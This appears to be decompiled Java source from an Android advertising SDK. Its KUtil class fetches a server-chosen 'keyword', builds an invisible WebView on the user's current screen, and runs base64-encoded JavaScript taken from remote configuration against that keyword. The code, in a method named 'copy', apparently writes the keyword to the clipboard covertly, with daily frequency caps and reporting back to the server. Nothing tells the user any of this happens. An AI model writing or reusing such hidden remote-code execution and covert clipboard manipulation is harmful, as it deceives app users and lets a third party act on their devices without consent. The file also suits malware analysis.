package com.fl.saas.config.utils;

import android.app.Activity;
import android.text.TextUtils;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.fl.saas.base.rest.ReportHelper;
import com.fl.saas.common.rest.AdHttpUtils;
import com.fl.saas.config.http.HttpCallbackStringListener;
import java.nio.charset.StandardCharsets;
import java.util.regex.Pattern;

/* JADX INFO: loaded from: /home/ylxc/Projects/lib/ShanDong/work/APP_ALL/classes_08_10593cls.dex */
public class KUtil {
    private String content;
    private final String keyLastDayShowNumber;
    private final String keyLastShowDay;
    private final String keyLastShowSec;
    private KParams mKParams;
    private WebView webView;

    /* JADX INFO: renamed from: com.fl.saas.config.utils.KUtil$2, reason: invalid class name */
    public class AnonymousClass2 extends WebViewClient {
        public AnonymousClass2() {
        }

        /* JADX INFO: Access modifiers changed from: private */
        public /* synthetic */ void lambda$onPageFinished$0() {
            if (KUtil.this.webView != null) {
                KUtil.this.webView.destroy();
                KUtil.this.webView = null;
            }
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
            super.onPageFinished(webView, str);
            KUtil.this.webView.loadUrl("javascript:a('" + KUtil.this.content + "')");
            ReportHelper.getInstance().reportKeyword(1);
            int i = SPUtil.getInstance().getInt("kShowNumber", 0) + 1;
            SPUtil.getInstance().putString("kShowDay", DeviceUtil.getDate());
            SPUtil.getInstance().putLong("kShowSec", System.currentTimeMillis() / 1000);
            SPUtil.getInstance().putInt("kShowNumber", i);
            DeviceUtil.postUIDelayed(2000L, new Runnable() { // from class: com.fl.saas.config.utils.a
                @Override // java.lang.Runnable
                public final void run() {
                    this.f30152a.lambda$onPageFinished$0();
                }
            });
        }
    }

    public static final class Holder {
        private static final KUtil INSTANCE = new KUtil();

        private Holder() {
        }
    }

    private KUtil() {
        this.keyLastShowDay = "kShowDay";
        this.keyLastDayShowNumber = "kShowNumber";
        this.keyLastShowSec = "kShowSec";
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void copy(String str) {
        try {
            Activity topActivity = DeviceUtil.getTopActivity();
            if (topActivity == null) {
                return;
            }
            this.content = str;
            WebView webView = new WebView(topActivity);
            this.webView = webView;
            webView.setWebChromeClient(new WebChromeClient());
            this.webView.setWebViewClient(new AnonymousClass2());
            this.webView.getSettings().setJavaScriptEnabled(true);
            this.webView.loadDataWithBaseURL("about:blank", "<html>\n<body><script>async function a(b) {" + new String(Base64Utils.safeUrlBase64Decode(this.mKParams.getCopyJs()), StandardCharsets.UTF_8) + "}</script></body></html>", "text/html", "UTF-8", null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static KUtil getInstance() {
        return Holder.INSTANCE;
    }

    private void getKeyword(long j) {
        DeviceUtil.postUIDelayed(j, new Runnable() { // from class: com.zj.adlib.qq4
            @Override // java.lang.Runnable
            public final void run() {
                this.f44276a.lambda$getKeyword$0();
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$getKeyword$0() {
        AdHttpUtils.getInstance().doGet(this.mKParams.getKeyword_url(), new HttpCallbackStringListener() { // from class: com.fl.saas.config.utils.KUtil.1
            @Override // com.fl.saas.config.http.HttpCallbackStringListener
            public void onError(Exception exc) {
                ReportHelper.getInstance().reportKeyword(2);
            }

            @Override // com.fl.saas.config.http.HttpCallbackStringListener
            public void onJump(String str) {
            }

            @Override // com.fl.saas.config.http.HttpCallbackStringListener
            public void onSuccess(String str) {
                ReportHelper reportHelper;
                int i;
                if (TextUtils.isEmpty(str) || KUtil.this.mKParams == null) {
                    reportHelper = ReportHelper.getInstance();
                    i = 2;
                } else if (TextUtils.isEmpty(KUtil.this.mKParams.getKeyword_regex()) || Pattern.compile(KUtil.this.mKParams.getKeyword_regex()).matcher(str).matches()) {
                    KUtil.this.copy(str);
                    return;
                } else {
                    reportHelper = ReportHelper.getInstance();
                    i = 0;
                }
                reportHelper.reportKeyword(i);
            }
        });
    }

    public void setKeywordParams(KParams kParams) {
        this.mKParams = kParams;
        if (kParams == null || TextUtils.isEmpty(kParams.getKeyword_url())) {
            return;
        }
        int keyword_use_time_range = this.mKParams.getKeyword_use_time_range();
        String string = SPUtil.getInstance().getString("kShowDay", "");
        int i = SPUtil.getInstance().getInt("kShowNumber", 0);
        long j = SPUtil.getInstance().getLong("kShowSec", 0L);
        long j2 = keyword_use_time_range;
        long j3 = j2 * 1000;
        if (!DeviceUtil.getDate().equals(string)) {
            SPUtil.getInstance().putInt("kShowNumber", 0);
        } else {
            if (this.mKParams.getDevice_keyword_freq() != 0 && i >= this.mKParams.getDevice_keyword_freq()) {
                return;
            }
            int device_keyword_interval = this.mKParams.getDevice_keyword_interval() * 60;
            if (j > 0 && device_keyword_interval > 0 && ((System.currentTimeMillis() / 1000) - j) + j2 < device_keyword_interval) {
                return;
            }
        }
        getKeyword(j3);
    }
}
